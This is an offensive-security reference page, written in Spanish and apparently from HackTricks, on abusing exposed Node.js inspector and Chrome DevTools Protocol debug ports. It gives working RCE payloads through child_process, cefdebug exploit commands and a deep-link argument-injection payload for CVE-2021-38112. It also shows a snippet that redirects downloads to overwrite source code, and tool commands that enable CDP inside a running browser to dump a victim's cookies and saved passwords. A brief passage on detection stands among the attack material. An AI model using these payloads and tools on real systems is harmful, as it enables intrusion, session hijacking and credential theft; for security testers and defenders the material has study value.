# Abuso de la depuración de Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Entre los ejemplos prácticos históricos se incluyen el walkthrough de Multimaster y el ataque al debugger de Visual Studio Code CVE-2019-1414; úsalos como contexto específico de cada versión, en lugar de asumir que todos los objetivos actuales de Electron o Chromium exponen las mismas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Información básica

[De la documentación](https://nodejs.org/learn/getting-started/debugging): Cuando se inicia con la opción `--inspect`, un proceso de Node.js escucha a un cliente de depuración. De forma **predeterminada**, escucha en el host y puerto **`127.0.0.1:9229`**. A cada proceso también se le asigna un **UUID** **único**.<sup>[[4]](#references)</sup>

Los clientes del inspector deben conocer e indicar la dirección del host, el puerto y el UUID para conectarse. Una URL completa tendrá un aspecto similar a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Como el **debugger tiene acceso completo al entorno de ejecución de Node.js**, un actor malicioso que pueda conectarse a este puerto podría ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).<sup>[[4]](#references)</sup>

Hay varias formas de iniciar un inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Cuando inicias un proceso inspeccionado, aparecerá algo como esto:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Los procesos basados en **CEF** (**Chromium Embedded Framework**) pueden exponer un depurador con `--remote-debugging-port=9222`. Esto expone el navegador a través del [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) en lugar de un inspector de Node.js, por lo que las cargas útiles basadas en `process` de Node.js no se aplican directamente de forma predeterminada.<sup>[[2]](#references)[[5]](#references)</sup>

Al iniciar un navegador en modo de depuración, aparecerá algo como esto:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumeración y control de un endpoint CDP

Los endpoints de descubrimiento HTTP distinguen el WebSocket del **browser** de los WebSockets de cada **target** (pestaña, worker, extensión, etc.). Consulta `/json/version` para obtener el endpoint del browser y `/json/list` para los targets; después, puedes controlar directamente los valores `webSocketDebuggerUrl` devueltos mediante mensajes similares a JSON-RPC de CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Por ejemplo, conéctate con `websocat "$BROWSER_WS"` y envía `{"id":1,"method":"Target.getTargets"}` o `{"id":2,"method":"Storage.getCookies"}`. En un target de página (`websocat "$PAGE_WS"`), `Runtime.evaluate` se ejecuta en ese renderer y `Page.captureScreenshot` devuelve una captura de pantalla codificada en base64. `document.cookie` no puede revelar cookies `HttpOnly`, mientras que `Storage.getCookies` solicita las cookies almacenadas en el navegador.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Navegadores, WebSockets y same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador pueden realizar solicitudes WebSocket y HTTP según el modelo de seguridad del navegador. Se necesita una **conexión HTTP inicial** para **obtener un id. de sesión del debugger único**. La **same-origin-policy** **impide** que los sitios web puedan realizar **esta conexión HTTP**. Como medida de seguridad adicional contra [**ataques de DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica que los **headers 'Host'** de la conexión especifiquen una **dirección IP** o exactamente **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> **Esta medida de seguridad impide explotar el inspector** para ejecutar código **simplemente enviando una solicitud HTTP** (lo que se podría hacer explotando una vuln SSRF).<sup>[[4]](#references)</sup>

### Iniciar el inspector en procesos en ejecución

Puedes enviar la **señal SIGUSR1** a un proceso de nodejs en ejecución para que **inicie el inspector** en el puerto predeterminado. Sin embargo, ten en cuenta que necesitas privilegios suficientes, por lo que esto podría darte **acceso privilegiado a la información dentro del proceso**, pero no una escalada directa de privilegios.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Esto es útil en contenedores porque **detener el proceso e iniciar uno nuevo** con `--inspect` **no es una opción**, ya que el **contenedor** será **terminado** junto con el proceso.<sup>[[6]](#references)</sup>

### Conectarse al inspector/depurador

Para conectarse a un **navegador basado en Chromium**, se puede acceder a las URL `chrome://inspect` o `edge://inspect` para Chrome o Edge, respectivamente. Al hacer clic en el botón Configure, se debe verificar que el **host y el puerto de destino** aparezcan correctamente en la lista. La imagen muestra un ejemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Después aparecerá una URL para acceder al depurador. Por ejemplo, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectarse al inspector/depurador: Para conectarse a un navegador basado en Chromium,...](<../../images/image (674).png>)

Con la **línea de comandos**, puedes conectarte a un depurador/inspector con:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectores** que se ejecutan localmente e **inyectar código** en ellos.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Ten en cuenta que los **exploits de RCE de NodeJS no funcionarán** si te conectas a un navegador mediante [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (tienes que revisar la API para encontrar cosas interesantes que hacer con ella).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE en el depurador/inspector de NodeJS

> [!TIP]
> Si has llegado aquí buscando cómo obtener [**RCE a partir de un XSS en Electron, consulta esta página.**](../../desktop-application-security/electron-desktop-apps/index.html)

Algunas formas comunes de obtener **RCE** cuando puedes **conectarte** a un **inspector** de Node consisten en usar algo como esto (parece que esto **no funcionará en una conexión con Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

Puedes consultar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
En esta sección solo enumeraré cosas interesantes que he visto que la gente ha usado para explotar este protocolo.

### Restricción del perfil predeterminado en Chrome 136+

A partir de **Chrome 136**, Chrome ignora `--remote-debugging-port` y `--remote-debugging-pipe` cuando apuntan al **directorio de datos predeterminado de Chrome**. El switch debe combinarse con un `--user-data-dir` no estándar, cuya clave de cifrado independiente y estado aislado del navegador impiden que esta sencilla técnica basada en flags exponga el perfil autenticado normal del usuario. No debe suponerse que esta restricción específica de Chrome también se aplique a versiones anteriores de Chrome, Chrome for Testing, aplicaciones Electron/CEF u otras variantes de Chromium sin verificarlo.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Por lo tanto, ver un proceso actual de Chrome iniciado solo con `--remote-debugging-port` **no** demuestra que CDP se haya activado. Confirma que el puerto esté escuchando y consulta `/json/version`; además, determina qué perfil lo respalda.<sup>[[14]](#references)</sup>

### Inyección de parámetros mediante deep links

En [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security descubrió que una aplicación basada en CEF **registró un URI** personalizado en el sistema (`workspaces://index.html`) que recibía la URI completa y luego **iniciaba la aplicació**n basada en CEF con una configuración que se construía parcialmente a partir de esa URI.<sup>[[8]](#references)</sup>

Se descubrió que los parámetros de la URI se decodificaban y se usaban para iniciar la aplicación básica de CEF, lo que permitía a un usuario **inyectar** la flag **`--gpu-launcher`** en la **línea de comandos** y ejecutar cualquier cosa.<sup>[[8]](#references)</sup>

Por lo tanto, un payload como:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Ejecutará calc.exe.<sup>[[8]](#references)</sup>

### Sobrescribir archivos

Cambia la carpeta donde se guardan los **archivos descargados** y descarga un archivo para **sobrescribir** el **código fuente** de la aplicación que se usa con frecuencia con tu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE y exfiltración mediante WebDriver

STAR Labs mostró que los servicios WebDriver/CDP expuestos pueden permitir la lectura arbitraria de archivos y RCE; en algunas configuraciones, DNS rebinding puede completar la cadena de explotación.<sup>[[9]](#references)</sup>

El servicio WebDriver de ChromeDriver es distinto de Chrome DevTools/CDP. Su capacidad [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) selecciona el ejecutable del navegador que se inicia para una sesión nueva. Si una persona sin privilegios puede acceder a un servicio ChromeDriver que se ejecuta como root y enviar una sesión con una ruta de ejecutable controlada por ella, ese inicio puede cruzar el límite de privilegios del servicio. Una respuesta vacía de `/sessions` no permite determinar si se pueden crear sesiones nuevas. Antes de concluir que la ruta es utilizable, inspecciona el propietario del proceso, la accesibilidad real del listener, la autorización de sesiones, el acceso al ejecutable y las restricciones de seguridad; el nombre del proceso o el puerto habitual por sí solos no son suficientes. [Las recomendaciones de seguridad de Google](https://developer.chrome.com/docs/chromedriver/security-considerations) indican que ChromeDriver debe ejecutarse con una cuenta sin privilegios. La enumeración pasiva no debe crear una sesión WebDriver.

Para consultar más casos históricos sobre automatización de navegadores y seguridad de Chromium, consulta el análisis de Counter WebDriver y los issues 773, 1742 y 1944 de Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Activación de CDP dentro de un proceso Chromium en ejecución

La restricción del perfil predeterminado de Chrome solo bloquea la ruta de activación por línea de comandos. Con acceso suficiente del mismo usuario para manipular el proceso del navegador, el [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) original y el [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) de Cobalt Strike invocan el método no exportado de Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` dentro del proceso `chrome.exe` o `msedge.exe` que ya está en ejecución. Por tanto, el endpoint pertenece al perfil real y conserva sus pestañas, extensiones, cookies y estado de autenticación.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

En procesos Chrome/Edge x64 normales, el BOF encuentra la ventana del navegador y el `chrome.dll`/`msedge.dll` cargado, busca firmas enmascaradas en el PE remoto, asigna stubs y un bloque de contexto, reemplaza temporalmente el procedimiento de ventana y despacha la llamada final en el **hilo de la interfaz de usuario** del navegador. Las entradas de ejecución pertinentes son `StartRemoteDebuggingServer`, el `operator new` de Chromium, `TCPServerSocketFactory::CreateForHttpServer` y la vtable de la factory. La ejecución se detiene salvo que cada firma obligatoria tenga una coincidencia única.<sup>[[15]](#references)[[16]](#references)</sup>

El BOF acepta un modo de navegador y un puerto opcional. A continuación, su script auxiliar puede verificar el endpoint y recopilar cookies; `chrome-iso` es una ruta separada para el límite de Windows Process Isolation de Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

La ruta `chrome-iso` usa únicamente handles con permisos de consulta al proceso aislado. Identifica el `chrome.dll` instalado cuya imagen PE tiene el mismo tamaño que el proceso en ejecución, resuelve símbolos de esa imagen local y usa la distribución de `WindowImpl` de Chromium, junto con `WM_COPYDATA` síncrono y un hook de User32 de una imagen existente, para llegar al hilo de UI.<sup>[[16]](#references)</sup>

> [!WARNING]
> Esta es una técnica de **manipulación del proceso del navegador tras la intrusión**, no un bypass de red sin autenticación. Depende de la build porque los símbolos C++ relevantes no se exportan y pueden cambiar después de las actualizaciones del navegador.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Actualización de firmas tras las actualizaciones del navegador

Usa la versión exacta de `chrome.dll` o `msedge.dll` instalada en el objetivo y su PDB correspondiente. `symchk.exe` del Windows SDK descarga los símbolos; después, los scripts del repositorio localizan `StartRemoteDebuggingServer`, deducen las entradas del allocator/socket-factory o validan todas las firmas integradas en el BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Un resultado sin coincidencias o con varias coincidencias no debe sustituirse por una dirección arbitraria. Si un patrón conocido de `operator new` o `CreateForHttpServer` ha cambiado demasiado como para crear una nueva máscara, usa `pe_signature_finder.py` con el PDB para inspeccionar ese símbolo y obtener una secuencia de bytes que sea única en el módulo de destino.<sup>[[16]](#references)[[18]](#references)</sup>

#### Extracción mediante navegador autenticado con CDP Toolkit

Esta técnica no descifra App-Bound Encryption (ABE) sin conexión ni elimina la vinculación al dispositivo. En su lugar, trata el navegador legítimo como un **oráculo de descifrado y un proxy de interacción autenticado**: `Storage.getCookies` solicita al navegador activo su almacén de cookies, mientras que los flujos de navegación y screencast mantienen las solicitudes, el almacenamiento, la autenticación empresarial y el comportamiento vinculado al dispositivo dentro del navegador existente de la víctima.<sup>[[17]](#references)[[18]](#references)</sup>

Tras enrutar el listener CDP de loopback a través del pivot del operador, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) puede enumerar y recopilar artefactos comunes.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` y `tabs screenshot` son principalmente wrappers de `/json/version`, la lista de destinos, `Storage.getCookies` y `Page.captureScreenshot`. En cambio, el historial, los marcadores, las extensiones y los metadatos de contraseñas requieren un destino temporal de WebUI `chrome://`/`edge://`: el toolkit espera a que se renderice la superficie, inspecciona su modelo o DOM, recopila el resultado y cierra el destino.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` va más allá: abre el origen real de inicio de sesión guardado, enfoca un campo de credenciales, selecciona la sugerencia nativa de autocompletado mediante eventos de entrada de CDP y lee los valores rellenados. El origen/puerto/ruta debe coincidir estrechamente con el realm de la contraseña guardada; el modo visible es la opción predeterminada más fiable porque la ventana emergente de sugerencias es una interfaz nativa del navegador.<sup>[[17]](#references)[[18]](#references)</sup>

Para la interacción en vivo, `browser-takeover screencast` transmite fotogramas y envía entradas a un destino real (incluidos los modos en segundo plano o fuera de pantalla). En cambio, `browser-takeover proxy` acepta localmente HTTP y HTTPS `CONNECT` y realiza solicitudes upstream a través de destinos ocultos de Chrome, recurriendo a pestañas en segundo plano cuando los destinos ocultos no están disponibles; esto conserva el contexto de red/autenticación de la víctima, pero es menos fiel con aplicaciones complejas del lado del cliente, porque el navegador del operador renderiza el contenido recibido.<sup>[[17]](#references)[[18]](#references)</sup>

Para la detección, no dependas únicamente de la telemetría de línea de comandos `--remote-debugging-*`: correlaciona también los handles inusuales y las operaciones de memoria dirigidas a procesos del navegador (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, creación de hilos), la inyección de DLL y los sockets de escucha loopback inesperados propiedad de Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

En un entorno real y **después de comprometer** un PC de usuario que utiliza un navegador basado en Chromium, una técnica histórica consistía en volver a iniciar el navegador con la depuración habilitada y reenviar el puerto loopback. Esto puede exponer el estado de navegación de la víctima en productos/versiones que aún aceptan el perfil seleccionado, pero Chrome 136+ no lo admitirá si se intenta con su directorio de datos predeterminado.<sup>[[7]](#references)[[14]](#references)</sup>

El comando original para volver a iniciar el navegador se conserva a continuación para objetivos antiguos o específicos de una versión. El segundo comando es la forma admitida en Chrome actual, pero crea un perfil aislado en lugar de volver a abrir el estado autenticado habitual de la víctima.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Para conocer técnicas específicas de macOS para reiniciar Chromium, extensiones y CDP, consulta [Inyección en Chromium en macOS](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Herramienta de inspección y explotación del debugger de CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Ejecución remota de código en Visual Studio Code mediante Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guía de depuración de Node.js - Primeros pasos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusar de la función de depuración de Chrome para observar y controlar sesiones de navegación de forma remota](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Ejecución remota de código en AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [¿Me hablas a mí? - RCE en WebDriver mediante DNS rebinding y CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - De bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (rastreador de errores de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (rastreador de errores de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (rastreador de errores de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Cambios en las opciones de depuración remota para mejorar la seguridad - Chrome para desarrolladores](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Inyectar CDP en un navegador Edge en ejecución: análisis profundo de la instrumentación del navegador en tiempo de ejecución](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - El regreso del monstruo de las cookies](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
